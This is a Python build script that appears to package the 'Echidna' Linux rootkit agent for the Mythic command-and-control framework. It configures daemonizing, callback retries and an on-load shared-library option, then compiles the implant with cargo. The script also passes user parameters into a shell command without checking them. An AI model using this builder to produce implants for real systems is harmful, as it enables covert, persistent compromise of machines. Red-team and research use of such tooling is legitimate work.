import asyncio
import json
import os
import pathlib
import sys
import tempfile
import traceback
from shutil import copytree
from mythic_container.PayloadBuilder import (
    PayloadType,
    SupportedOS,
    BuildParameter,
    BuildParameterType,
    BuildResponse,
    BuildStatus,
)

# pylint: disable=too-many-locals,too-many-branches,too-many-statements


# Class defining information about the Echidna rootkit payload
class Echidna(PayloadType):
    name = "echidna"  # Name of the payload
    file_extension = "exe"  # default file extension to use when creating payloads
    author = "@viceroy_researcher"  # authors

    # Platforms that Echidna supports (Linux only for rootkit functionality)
    supported_os = [
        SupportedOS.Linux,
    ]
    wrapper = False
    wrapped_payloads = []
    # Description of the payload in Mythic
    note = "Linux rootkit agent with LKM, eBPF, and LD_PRELOAD techniques"

    # Payload does not support dynamic loading
    supports_dynamic_loading = False
    mythic_encrypts = False
    build_parameters = [
        # Add a build option which specifies whether the agent should fork in the
        # background on Linux hosts
        BuildParameter(
            name="daemonize",
            parameter_type=BuildParameterType.Boolean,
            description="Daemonize the process on Linux (fork to background).",
            default_value=False,
            required=True,
        ),
        # Add a build option which specifies the number of initial checkin attempts
        BuildParameter(
            name="connection_retries",
            parameter_type=BuildParameterType.String,
            description="Number of times to try and reconnect if the initial checkin fails.",
            default_value="1",
            verifier_regex="^[0-9]+$",
            required=True,
        ),
        # Add a build option for target architecture
        BuildParameter(
            name="architecture",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target architecture.",
            default_value="x64",
            choices=["x64", "x86"],
            required=True,
        ),
        # Add a build option for working hours
        BuildParameter(
            name="working_hours",
            parameter_type=BuildParameterType.String,
            description="Working hours for the agent (use 24 hour time)",
            default_value="00:00-23:59",
            verifier_regex=r"^[0-2][0-9]:[0-5][0-9]-[0-2][0-9]:[0-5][0-9]",
            required=True,
        ),
        # Add a build option for static linking
        BuildParameter(
            name="static",
            parameter_type=BuildParameterType.Boolean,
            description="Statically link payload. (Only works for 64 bit payloads)",
            default_value=False,
            required=True,
        ),
        # Output format
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Payload output format",
            default_value="executable",
            choices=["executable", "shared library (.so)"],
            required=True,
        ),
        # Configuration for the shared library execution
        BuildParameter(
            name="shared_config",
            parameter_type=BuildParameterType.ChooseOne,
            description="Shared library entrypoint configuration",
            default_value="library export",
            choices=["library export", "run on load"],
            required=True,
        ),
        # Shared library export name
        BuildParameter(
            name="shared_export",
            parameter_type=BuildParameterType.String,
            description="Shared library entrypoint export name",
            default_value="entrypoint",
            required=False,
        ),
    ]
    # Supported C2 profiles for Echidna
    c2_profiles = ["http"]

    agent_path = pathlib.Path(".") / "echidna" / "mythic"
    agent_code_path = pathlib.Path(".") / "echidna" / "agent_code"
    # agent_icon_path = agent_path / "agent_icon" / "echidna.svg"

    # This function is called to build a new payload
    async def build(self) -> BuildResponse:
        # Setup a new build response object
        resp = BuildResponse(status=BuildStatus.Error)

        try:
            # Make a temporary directory for building the implant
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)

            # Copy the implant code to the temporary directory
            copytree(self.agent_code_path, agent_build_path.name, dirs_exist_ok=True)

            # Get the C2 profile information
            c2 = self.c2info[0]
            profile = c2.get_c2profile()["name"]
            if profile not in self.c2_profiles:
                resp.build_message = "Invalid C2 profile name specified"
                return resp

            # Get the architecture from the build parameter
            if self.get_parameter("architecture") == "x64":
                arch = "x86_64"
            else:
                arch = "i686"

            # Start formulating the rust flags
            rustflags = []

            # Check for static linking (Linux only)
            abi = "gnu"
            if self.get_parameter("static"):
                rustflags.append("-C target-feature=+crt-static")
                abi = "musl"

            # Fail if trying to build a 32 bit statically linked payload.
            # This is a limitation in musl/openssl since 32 bit integers in musl libc
            # do not allow for enough precision in openssl.
            if arch == "i686" and abi == "musl":
                raise Exception("Cannot build 32 bit statically linked payload.")

            # Get the target OS to compile for
            target_os = f"{arch}-unknown-linux-{abi}"

            # Combine the C2 parameters with the build parameters
            c2_params = c2.get_parameters_dict()
            c2_params["UUID"] = self.uuid

            # Basic agent configuration
            c2_params["daemonize"] = str(self.get_parameter("daemonize"))
            c2_params["connection_retries"] = self.get_parameter("connection_retries")
            c2_params["working_hours"] = self.get_parameter("working_hours")
           
            # Start formulating the command to build the agent
            command = "env "

            # Manually specify the C compiler for 32 bit Linux builds.
            if arch == "i686":
                command += "CC_i686-unknown-linux-gnu=clang "

            # Set up openssl environment variables
            openssl_env = "OPENSSL_STATIC=yes "
            if arch == "x64":
                openssl_env += "OPENSSL_LIB_DIR=/usr/lib64 "
            else:
                openssl_env += "OPENSSL_LIB_DIR=/usr/lib "

            openssl_env += "OPENSSL_INCLUDE_DIR=/usr/include "
            command += openssl_env

            # Add any rustflags if they exist
            if rustflags:
                rustflags_str = " ".join(rustflags)
                command += f'RUSTFLAGS="{rustflags_str}" '

            # Loop through each C2/build parameter creating environment variable
            # key/values for each option
            for key, val in c2_params.items():
                if isinstance(val, str):
                    command += f"{key}='{val}' "
                else:
                    v = json.dumps(val)
                    command += f"{key}='{v}' "

            features = []
            build_shared = self.get_parameter("output").startswith("shared library")

            # Configuration for the shared library output
            if build_shared:
                export_name = self.get_parameter("shared_export")
                onload = self.get_parameter("shared_config") == "run on load"

                if onload:
                    features.append("onload")
                elif export_name != "entrypoint":
                    features.append("user")
                    command += f"ECHIDNA_SHARED_ENTRYPOINT='{export_name}' "

            # Finish off the cargo command used for building the agent
            command += f"cargo build --target {target_os} --release"

            if build_shared:
                command += " -p echidna_shared"

            if len(features) > 0:
                command += f" --features {','.join(features)}"

            # Copy any prebuilt dependencies if they exist
            deps_suffix = "_static" if self.get_parameter("static") else ""
            deps_path = f"/opt/{target_os}{deps_suffix}"
            if os.path.exists(deps_path):
                copytree(
                    f"{deps_path}",
                    f"{agent_build_path.name}/target",
                    dirs_exist_ok=True,
                )

            # Set the build stdout to the build command invocation
            resp.build_message = str(command)

            # Run the cargo command which builds the agent
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path.name,
            )

            # Grab stdout/stderr
            stdout, stderr = await proc.communicate()

            # Check if the build command returned an error and send that error to Mythic
            if proc.returncode != 0:
                resp.set_build_stdout(stdout.decode())
                resp.set_build_stderr(stderr.decode())
                raise Exception("Failed to build payload. Check Build Errors")

            # Copy any dependencies that were compiled
            built_path = f"{agent_build_path.name}/target"
            if os.path.exists(built_path):
                copytree(f"{built_path}", f"{deps_path}", dirs_exist_ok=True)

            # Check if there is anything on stdout/stderr and forward to Mythic
            if stdout:
                resp.set_build_stdout(f"{command}\n\n{stdout.decode()}")
            if stderr:
                resp.set_build_stderr(stderr.decode())

            target_name = ""

            # Parse the output format for the payload
            if build_shared:
                # Set the payload output to the built shared library
                target_name = "libechidna_shared.so"
            else:
                # Set the payload output to the built executable
                target_name = "echidna"

            payload_path = (
                f"{agent_build_path.name}/target/{target_os}/release/{target_name}"
            )
            with open(payload_path, "rb") as f:
                resp.payload = f.read()

            # Notify Mythic that the build was successful
            resp.set_build_message("Successfully built Echidna rootkit agent.")
            resp.build_message += "\n"
            resp.build_message += str(command)
            resp.status = BuildStatus.Success

        except Exception as e:
            # Return the python exception to the Mythic build message
            exc_type, exc_value, exc_traceback = sys.exc_info()
            resp.build_stderr += f"Error building payload: {e} traceback: " + repr(
                traceback.format_exception(exc_type, exc_value, exc_traceback)
            )

        return resp